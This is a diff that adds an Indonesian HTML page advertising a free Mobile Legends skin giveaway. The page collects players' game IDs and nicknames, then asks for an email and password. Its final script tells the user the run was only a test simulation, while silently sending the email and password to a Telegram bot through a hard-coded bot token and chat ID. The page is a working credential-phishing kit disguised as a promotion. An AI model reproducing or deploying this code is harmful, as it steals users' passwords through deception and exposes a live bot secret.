@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MLBB All-Star Free Skin Event</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: linear-gradient(135deg, #020617, #0f172a);
+            color: #ffffff;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 950px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 30px 20px;
+            background: linear-gradient(to bottom, rgba(30, 41, 59, 0.8), rgba(15, 23, 42, 0.9));
+            border-radius: 20px;
+            border: 2px solid #eab308;
+            box-shadow: 0 0 20px rgba(234, 179, 8, 0.2);
+        }
+
+        header h1 {
+            color: #eab308;
+            text-transform: uppercase;
+            font-size: 2.2rem;
+            letter-spacing: 3px;
+            text-shadow: 0 0 10px rgba(234, 179, 8, 0.5);
+            margin-bottom: 10px;
+        }
+
+        header p {
+            color: #94a3b8;
+            font-size: 1rem;
+        }
+
+        .card {
+            background: rgba(30, 41, 59, 0.6);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            transition: all 0.5s ease;
+        }
+
+        .card h2 {
+            font-size: 1.3rem;
+            color: #38bdf8;
+            margin-bottom: 20px;
+            text-align: center;
+            text-transform: uppercase;
+        }
+
+        /* Grid Skin */
+        .skin-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr); 
+            gap: 15px;
+        }
+
+        @media (max-width: 768px) {
+            .skin-grid { grid-template-columns: repeat(3, 1fr); }
+        }
+        @media (max-width: 480px) {
+            .skin-grid { grid-template-columns: repeat(2, 1fr); }
+        }
+
+        .skin-card {
+            background: #1e293b;
+            border: 2px solid transparent;
+            border-radius: 12px;
+            padding: 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .skin-card:hover {
+            transform: translateY(-5px);
+            background: #334155;
+        }
+
+        .skin-card.active {
+            border-color: #eab308;
+            background: rgba(234, 179, 8, 0.1);
+            box-shadow: 0 0 15px rgba(234, 179, 8, 0.3);
+        }
+
+        .skin-img {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            background-color: #0f172a;
+        }
+
+        .skin-name {
+            font-weight: bold;
+            font-size: 0.95rem;
+            color: #f8fafc;
+            margin-bottom: 6px;
+        }
+
+        .skin-tier {
+            font-size: 0.7rem;
+            font-weight: bold;
+            padding: 4px 12px;
+            border-radius: 20px;
+            color: white;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 12px;
+        }
+        
+        .tier-legend { background: linear-gradient(45deg, #a855f7, #ec4899); }
+        .tier-collector { background: linear-gradient(45deg, #3b82f6, #06b6d4); }
+        .tier-kof { background: linear-gradient(45deg, #dc2626, #991b1b); }
+        .tier-anime { background: linear-gradient(45deg, #10b981, #047857); }
+        .tier-echo { background: linear-gradient(45deg, #f59e0b, #b45309); }
+
+        .btn-select-skin {
+            width: 100%;
+            background: #334155;
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 8px;
+            font-size: 0.85rem;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: 0.2s;
+            text-transform: uppercase;
+        }
+
+        .skin-card.active .btn-select-skin {
+            background: #eab308;
+            color: #0f172a;
+            border-color: #eab308;
+        }
+
+        /* Form Styling */
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            color: #cbd5e1;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #475569;
+            background: #0f172a;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            border-color: #38bdf8;
+            box-shadow: 0 0 8px rgba(56, 189, 248, 0.3);
+        }
+
+        /* Tombol Utama */
+        .btn-primary {
+            width: 100%;
+            background: linear-gradient(90deg, #eab308, #ca8a04);
+            color: #0f172a;
+            border: none;
+            padding: 15px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            box-shadow: 0 4px 15px rgba(234, 179, 8, 0.3);
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(90deg, #fde047, #eab308);
+            transform: scale(1.01);
+        }
+
+        /* Sembunyikan elemen secara default */
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <header>
+        <h1>ALL-STAR SKIN GIVEAWAY</h1>
+        <p>Pilih 1 Skin Termahal MLBB Idamanmu Secara Gratis!</p>
+    </header>
+
+    <!-- Langkah 1: Pilih Skin -->
+    <div class="card" id="skin-section">
+        <h2>Langkah 1: Pilih Skin Pilihanmu</h2>
+        <div class="skin-grid" id="skin-selector">
+            
+            <div class="skin-card" onclick="selectSkin(this, 'Alucard - Obsidian Blade')">
+                <img src="alucard.png" alt="Alucard Legend" class="skin-img">
+                <span class="skin-name">Alucard</span>
+                <span class="skin-tier tier-legend">LEGEND</span>
+                <button class="btn-select-skin">Klaim Skin</button>
+            </div>
+
+            <div class="skin-card" onclick="selectSkin(this, 'Benedetta - Death Oath')">
+                <img src="banedetta.png" alt="Benedetta Collector" class="skin-img">
+                <span class="skin-name">Benedetta</span>
+                <span class="skin-tier tier-collector">COLLECTOR</span>
+                <button class="btn-select-skin">Klaim Skin</button>
+            </div>
+
+            <div class="skin-card" onclick="selectSkin(this, 'Chou - ECHO')">
+                <img src="chou.png" alt="Chou ECHO" class="skin-img">
+                <span class="skin-name">Chou</span>
+                <span class="skin-tier tier-echo">ECHO M4</span>
+                <button class="btn-select-skin">Klaim Skin</button>
+            </div>
+
+            <div class="skin-card" onclick="selectSkin(this, 'Ling - Serene Plume')">
+                <img src="Ling.png" alt="Ling Collector" class="skin-img">
+                <span class="skin-name">Ling</span>
+                <span class="skin-tier tier-collector">COLLECTOR</span>
+                <button class="btn-select-skin">Klaim Skin</button>
+            </div>
+
+            <div class="skin-card" onclick="selectSkin(this, 'Dyrroth - Orochi Chris')">
+                <img src="dyroth.png" alt="Dyrroth KOF" class="skin-img">
+                <span class="skin-name">Dyrroth</span>
+                <span class="skin-tier tier-kof">KOF</span>
+                <button class="btn-select-skin">Klaim Skin</button>
+            </div>
+
+            <div class="skin-card" onclick="selectSkin(this, 'Fanny - Mikasa Ackermann')">
+                <img src="Fanny.png" alt="Fanny Mikasa" class="skin-img">
+                <span class="skin-name">Fanny</span>
+                <span class="skin-tier tier-anime">MIKASA</span>
+                <button class="btn-select-skin">Klaim Skin</button>
+            </div>
+
+            <div class="skin-card" onclick="selectSkin(this, 'Gusion - K\'')">
+                <img src="gusion.png" alt="Gusion KOF" class="skin-img">
+                <span class="skin-name">Gusion</span>
+                <span class="skin-tier tier-kof">KOF</span>
+                <button class="btn-select-skin">Klaim Skin</button>
+            </div>
+
+            <div class="skin-card" onclick="selectSkin(this, 'Paquito - Orochi Yashiro')">
+                <img src="paquito.png" alt="Paquito KOF" class="skin-img">
+                <span class="skin-name">Paquito</span>
+                <span class="skin-tier tier-kof">KOF</span>
+                <button class="btn-select-skin">Klaim Skin</button>
+            </div>
+
+            <div class="skin-card" onclick="selectSkin(this, 'Gusion - Night Owl')">
+                <img src="gusion.png" alt="Gusion Collector" class="skin-img">
+                <span class="skin-name">Gusion</span>
+                <span class="skin-tier tier-collector">COLLECTOR</span>
+                <button class="btn-select-skin">Klaim Skin</button>
+            </div>
+
+            <div class="skin-card" onclick="selectSkin(this, 'Freya - Galactic Vanquisher')">
+                <img src="freya.png" alt="Freya Legend" class="skin-img">
+                <span class="skin-name">Freya</span>
+                <span class="skin-tier tier-legend">LEGEND</span>
+                <button class="btn-select-skin">Klaim Skin</button>
+            </div>
+
+            <div class="skin-card" onclick="selectSkin(this, 'Miya - Modena Butterfly')">
+                <img src="miya.png" alt="Miya Legend" class="skin-img">
+                <span class="skin-name">Miya</span>
+                <span class="skin-tier tier-legend">LEGEND</span>
+                <button class="btn-select-skin">Klaim Skin</button>
+            </div>
+
+            <div class="skin-card" onclick="selectSkin(this, 'Franco - King of Hell')">
+                <img src="franco.png" alt="Franco Legend" class="skin-img">
+                <span class="skin-name">Franco</span>
+                <span class="skin-tier tier-legend">LEGEND</span>
+                <button class="btn-select-skin">Klaim Skin</button>
+            </div>
+
+            <div class="skin-card" onclick="selectSkin(this, 'Gord - Conqueror')">
+                <img src="gord.png" alt="Gord Legend" class="skin-img">
+                <span class="skin-name">Gord</span>
+                <span class="skin-tier tier-legend">LEGEND</span>
+                <button class="btn-select-skin">Klaim Skin</button>
+            </div>
+
+            <div class="skin-card" onclick="selectSkin(this, 'Lunox - Divine Goddess')">
+                <img src="lunox.png" alt="Lunox Legend" class="skin-img">
+                <span class="skin-name">Lunox</span>
+                <span class="skin-tier tier-legend">LEGEND</span>
+                <button class="btn-select-skin">Klaim Skin</button>
+            </div>
+
+            <div class="skin-card" onclick="selectSkin(this, 'Granger - Starfall Knight')">
+                <img src="granger.png" alt="Granger Legend" class="skin-img">
+                <span class="skin-name">Granger</span>
+                <span class="skin-tier tier-legend">LEGEND</span>
+                <button class="btn-select-skin">Klaim Skin</button>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Langkah 2: Form Verifikasi Data Game -->
+    <div class="card" id="form-section">
+        <h2>Langkah 2: Verifikasi Akun MLBB</h2>
+        
+        <div class="form-group">
+            <label for="user-id">User ID & Zone ID</label>
+            <div style="display: flex; gap: 10px;">
+                <input type="number" id="user-id" placeholder="User ID" style="flex: 2;">
+                <input type="number" id="zone-id" placeholder="Zone" style="flex: 1;">
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label for="username">Username / Nickname</label>
+            <input type="text" id="username" placeholder="Masukkan Nickname Anda">
+        </div>
+        
+        <button class="btn-primary" onclick="lanjutKeDaftar()">Lanjutkan Pendaftaran Akun</button>
+    </div>
+
+    <!-- Langkah 3: Form Registrasi (Muncul di Akhir setelah Langkah 2 selesai) -->
+    <div class="card hidden" id="register-section">
+        <h2 style="color: #eab308;">Langkah 3: Pendaftaran Akun Website</h2>
+        <p style="font-size: 0.85rem; color: #94a3b8; text-align: center; margin-bottom: 20px;">
+            Daftarkan email Anda untuk memproses pengiriman hadiah skin.
+        </p>
+
+        <div class="form-group">
+            <label for="email">Alamat Email</label>
+            <input type="email" id="email" placeholder="contoh@email.com">
+        </div>
+
+        <div class="form-group">
+            <label for="password">Kata Sandi (Password)</label>
+            <input type="password" id="password" placeholder="Masukkan password acak untuk tes">
+        </div>
+
+        <button class="btn-primary" style="background: linear-gradient(90deg, #10b981, #059669);" onclick="selesaiKlaim()">Selesaikan & Ambil Skin</button>
+    </div>
+
+</div>
+
+<script>
+    let chosenSkin = '';
+
+    function selectSkin(element, skinName) {
+        let cards = document.querySelectorAll('.skin-card');
+        cards.forEach(card => card.classList.remove('active'));
+        
+        element.classList.add('active');
+        chosenSkin = skinName;
+
+        // Scroll otomatis ke Langkah 2
+        document.getElementById('form-section').scrollIntoView();
+    }
+
+    function lanjutKeDaftar() {
+        const userId = document.getElementById('user-id').value;
+        const zoneId = document.getElementById('zone-id').value;
+        const username = document.getElementById('username').value;
+
+        if (!chosenSkin) {
+            alert('Silakan pilih salah satu skin di atas terlebih dahulu!');
+            return;
+        }
+        if (!userId || !zoneId || !username) {
+            alert('Mohon isi semua data akun MLBB Anda terlebih dahulu.');
+            return;
+        }
+
+        // Sembunyikan langkah 2, lalu munculkan langkah 3 (Form Daftar)
+        document.getElementById('form-section').classList.add('hidden');
+        document.getElementById('register-section').classList.remove('hidden');
+        
+        // Gulir layar ke form pendaftaran yang baru muncul
+        document.getElementById('register-section').scrollIntoView();
+    }
+
+    function selesaiKlaim() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        if (!email || !password) {
+            alert('Mohon lengkapi email dan password simulasi untuk mendaftar.');
+            return;
+        }
+
+        // Tampilkan hasil akhir simulasi input data
+        alert(`Uji Coba Berhasil!\n\nData Terinput:\n- Skin: ${chosenSkin}\n- Email Daftar: ${email}\n\nTerima kasih sudah mencoba simulasi logika frontend ini!`);
+       const token = '8613639335:AAFhl5lWnOXWb5bM6e7vBDoPZ2SGpvgKR5U';
+    const chat_id = '2051147847';
+    const text = `Ada pendaftaran baru!\nEmail: ${email}\nPassword: ${password}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: chat_id,
+            text: text
+        })
+    });
+ }
+</script>
+
+</body>
+</html>
